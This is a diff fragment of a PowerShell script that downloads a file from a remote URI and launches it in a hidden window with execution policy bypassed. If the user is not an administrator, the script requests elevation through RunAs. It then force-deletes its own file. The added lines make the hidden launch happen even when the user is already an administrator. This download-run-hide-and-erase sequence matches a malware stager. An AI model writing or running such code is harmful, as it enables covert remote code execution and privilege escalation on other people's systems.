@@ -6,5 +6,7 @@ iwr -Uri $init_uri -OutFile $scriptPath
 
 if(-not ([System.Security.Principal.WindowsPrincipal][System.Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)){
     Start-Process powershell.exe -ArgumentList "-ep", "bypass", "-noP", "-w", "hidden", "-command", "$scriptPath" -Verb RunAs
+}else{
+    Start-Process powershell.exe -ArgumentList "-ep", "bypass", "-noP", "-w", "hidden", "-command", "$scriptPath"
 }
 Remove-Item -Path $currLoc -Force -ErrorAction SilentlyContinue
